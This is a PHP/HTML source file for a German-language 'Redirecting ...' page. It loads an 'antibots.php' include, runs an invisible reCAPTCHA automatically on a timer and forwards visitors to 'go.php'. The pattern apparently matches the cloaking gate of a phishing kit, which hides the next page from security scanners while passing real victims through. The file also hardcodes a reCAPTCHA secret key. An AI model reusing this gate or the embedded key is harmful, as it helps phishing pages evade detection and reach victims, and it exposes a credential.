<?php
include('antibots.php');
?>
<html>
<head>
<meta charset="utf-8">
<title>Redirecting ...</title>
<script src="https://www.google.com/recaptcha/api.js" async defer></script>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2000)</script>
<script>
    function onSubmit(token) {
        document.getElementById("i-recaptcha").submit();
    }
</script>
</head>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},2500)</script>
<body>
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    function post_captcha($user_response) {
        $fields_string = '';
        $fields = array(
            'secret' => '6LeesMAUAAAAAIoukGZENQ_gk139cMTp_VqUXkdB',
            'response' => $user_response
        );
        foreach($fields as $key=>$value)
        $fields_string .= $key . '=' . $value . '&';
        $fields_string = rtrim($fields_string, '&');

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/api/siteverify');
        curl_setopt($ch, CURLOPT_POST, count($fields));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);

        $result = curl_exec($ch);
        curl_close($ch);

        return json_decode($result, true);
    }

    $res = post_captcha($_POST['g-recaptcha-response']);

    if (!$res['success']) {
        echo 'reCAPTCHA error';
    } else {

        echo '<br><p>CAPTCHA was completed successfully!</p><br>';
    }
} else { 
}
?>
<script>Window.onload = setTimeout(function(){grecaptcha.execute()},3000)</script>
<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><center><form id='i-recaptcha' action="go.php" method="post">
<button class="g-recaptcha" data-sitekey="6LeesMAUAAAAAJgWhynJixSAzqp3msMor-Y5r-Wh" data-callback="onSubmit">
Klicken Sie hier, wenn Sie nicht innerhalb weniger Sekunden weitergeleitet werden
</button>
</form></center>
</body>
</html>
<?php ?>
